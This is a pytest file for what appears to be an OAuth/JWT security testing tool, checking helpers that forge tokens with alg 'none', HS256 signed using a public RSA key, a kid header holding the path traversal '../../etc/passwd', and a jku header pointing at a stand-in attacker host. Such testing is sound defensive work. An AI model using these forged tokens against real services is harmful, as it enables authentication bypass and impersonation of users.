import base64
import hashlib
import hmac
import json

import jwt
import pytest

from oauthive.jose.forge import (
    HSSigner,
    RSASigner,
    forge_alg_none,
    forge_hs256_with_pubkey,
    forge_with_header,
    generate_attacker_rsa,
    public_key_pem,
)
from oauthive.jose.verify import unsafe_decode


def _b64u_pad(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def test_forge_alg_none_structure():
    token = forge_alg_none({"sub": "victim", "aud": "rp"})
    h_b64, p_b64, s_b64 = token.split(".")
    header = json.loads(_b64u_pad(h_b64))
    claims = json.loads(_b64u_pad(p_b64))
    assert header == {"alg": "none", "typ": "JWT"}
    assert claims["sub"] == "victim"
    assert s_b64 == ""  # empty signature


def test_alg_none_is_rejected_by_pyjwt_by_default():
    token = forge_alg_none({"sub": "x"})
    with pytest.raises(jwt.InvalidTokenError):
        jwt.decode(token, "any-secret", algorithms=["HS256"])


def test_alg_none_passes_with_explicit_opt_in():
    """Demonstrates the classic broken verifier: allowing algorithm='none'."""
    token = forge_alg_none({"sub": "x", "aud": "rp"})
    decoded = jwt.decode(
        token,
        "",
        algorithms=["none"],
        options={"verify_signature": False, "verify_aud": False},
    )
    assert decoded["sub"] == "x"


def test_forge_hs256_with_pubkey_signature_matches_manual_hmac():
    """If a verifier uses HS256 with the RP's stored public key as the shared
    secret, the forge must produce a byte-for-byte valid HMAC over the signing
    input. Modern PyJWT blocks this path on the *verify* side (see
    jwt.exceptions.InvalidKeyError when PEM is passed as an HMAC key), but
    bespoke verifiers that HMAC with key-file bytes directly are still found
    in the wild."""
    _priv, pub, _ = generate_attacker_rsa()
    pem = public_key_pem(pub)
    token = forge_hs256_with_pubkey({"sub": "attacker", "aud": "rp"}, pem)
    h_b64, p_b64, s_b64 = token.split(".")
    signing_input = f"{h_b64}.{p_b64}".encode()
    expected = hmac.new(pem, signing_input, hashlib.sha256).digest()
    assert _b64u_pad(s_b64) == expected


def test_pyjwt_blocks_hs256_with_pem_key():
    """Defensive regression: upstream PyJWT refuses to accept a PEM public key
    as an HMAC secret. If this stops being true in a future version we want
    to notice, because our 'hs256_pubkey' forge still works against any
    verifier that HMACs with key-file bytes itself."""
    _priv, pub, _ = generate_attacker_rsa()
    pem = public_key_pem(pub)
    token = forge_hs256_with_pubkey({"sub": "x"}, pem)
    with pytest.raises(jwt.InvalidKeyError):
        jwt.decode(token, pem, algorithms=["HS256"], options={"verify_signature": True})


def test_forge_with_header_injects_kid():
    priv, _pub, _jwk = generate_attacker_rsa()
    header = {"alg": "RS256", "typ": "JWT", "kid": "../../etc/passwd"}
    token = forge_with_header({"sub": "x"}, header, RSASigner(priv))
    d = unsafe_decode(token)
    assert d.header["kid"] == "../../etc/passwd"


def test_forge_with_header_jku_pivot_verifies_with_attacker_jwks():
    priv, _pub, jwk = generate_attacker_rsa()
    header = {
        "alg": "RS256",
        "typ": "JWT",
        "jku": "https://evil.example.test/jwks.json",
        "kid": jwk["kid"],
    }
    token = forge_with_header({"sub": "attacker", "aud": "rp"}, header, RSASigner(priv))
    # A verifier that fetched the attacker's JWKS from jku would extract the
    # attacker's public key; PyJWT can validate against it.
    pub_jwk_json = json.dumps(jwk)
    pub_key = jwt.algorithms.RSAAlgorithm.from_jwk(pub_jwk_json)
    decoded = jwt.decode(
        token,
        pub_key,
        algorithms=["RS256"],
        options={"verify_aud": False, "verify_exp": False, "verify_iat": False},
    )
    assert decoded["sub"] == "attacker"


def test_hssigner_matches_manual_hmac():
    s = HSSigner(b"secret")
    data = b"hello"
    assert s.sign(data) == hmac.new(b"secret", data, hashlib.sha256).digest()
